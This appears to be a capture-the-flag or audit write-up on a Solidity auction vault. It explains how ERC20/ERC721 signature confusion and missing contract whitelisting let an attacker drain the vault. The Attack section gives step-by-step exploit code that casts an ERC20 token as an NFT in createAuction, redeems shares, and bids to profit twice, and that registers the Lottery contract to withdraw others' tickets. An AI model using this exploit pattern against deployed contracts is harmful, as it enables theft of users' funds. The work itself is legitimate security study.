### Vulnerabilities

ERC20 and ERC721 share very similar `transfer` and `transferFrom` signatures. The only difference is that the last `uint256` argument represents an `amount` for ERC20 and a `tokenId` for ERC721. Since `AuctionManager` does not enforce any contract whitelisting, it is possible to:
  1. Register an auction token for an arbitrary underlying, including ERC721 contracts:
```solidity
    function registerAuctionToken(IERC20 underlying, string memory name, string memory symbol) external {
        require(address(auctionTokens[underlying]) == address(0), "AuctionToken already exists");
        AuctionToken token = new AuctionToken(name, symbol, underlying, vault, IAuctionManager(address(this)));
        token.transferOwnership(address(this));
        auctionTokens[underlying] = token;
    }
```
  2. Create an auction for an arbitrary token, including ERC20 tokens:

```solidity
    // Create a new auction.
    function createAuction(
>>>     IERC721 nftContract,
        uint256 tokenId,
        uint256 minPrice,
        uint256 askingPrice,
        IERC20 paymentToken,
        uint256 duration
```

### Attack

How to get NISC and USDC from the `AuctionVault`?

1. Deposit an ERC20 token into the `AuctionManager` to receive shares (auction tokens).
2. Create an auction using an ERC20 token instead of an NFT, for example:
    `auctionManager.createAuction(IERC721(address(nisc)), 266_000e18, 0, 0, nisc, 86400);`
3. This transfers tokens to the `AuctionVault` and increases the vault’s `totalAssets`.
4. Redeem auction token shares to capture a portion of the vault’s assets, including funds that were already sitting in the vault as well as assets received during auction creation.
5. Buy out the auction with a `bid`, which transfers the ERC20 tokens back to the attacker.
6. As a result, the attacker effectively profits twice: first by redeeming shares and then by buying back the same tokens via the auction.
7. Example attack flow:
```solidity
        /// AUCTION ATTACK
        nisc.approve(address(auctionManager), type(uint256).max);
        usdc.approve(address(auctionManager), type(uint256).max);

        auctionManager.depositERC20(nisc, 200_000e18);
        IERC20 aNisc = auctionManager.auctionTokens(nisc);
        IERC20 aUsdc = auctionManager.auctionTokens(usdc);

        uint256 id = auctionManager.auctionCount();
        auctionManager.createAuction(IERC721(address(nisc)), 266_000e18, 0, 0, nisc, 86400);
        auctionManager.withdrawERC20(nisc, aNisc.balanceOf(player) - 10);
        auctionManager.bid(id, 1);
```

How to get `Lottery` NFTs from the `AuctionVault`?

1. Ticket 0 can be purchased from a regular auction. The USDC used can then be recovered using the attack described above.
2. Purchase Ticket 3 directly from the `Lottery` contract.
3. Register the `Lottery` contract as an auction token.
4. Deposit Ticket 3 using `depositERC20`.
5. Withdraw Ticket 1 and Ticket 2 using `withdrawERC20`.
6. Attack flow:
   
```solidity
        auctionManager.registerAuctionToken(IERC20(address(lottery)), "REKT", "REKT");
        IERC20 aLot = auctionManager.auctionTokens(IERC20(address(lottery)));
        usdc.approve(address(lottery), type(uint256).max);
        lottery.purchaseTicket("HUH?");
        lottery.approve(address(auctionManager), 3);
        auctionManager.depositERC20(IERC20(address(lottery)), 3);
        auctionManager.withdrawERC20(IERC20(address(lottery)), 1);
        auctionManager.withdrawERC20(IERC20(address(lottery)), 2);
```
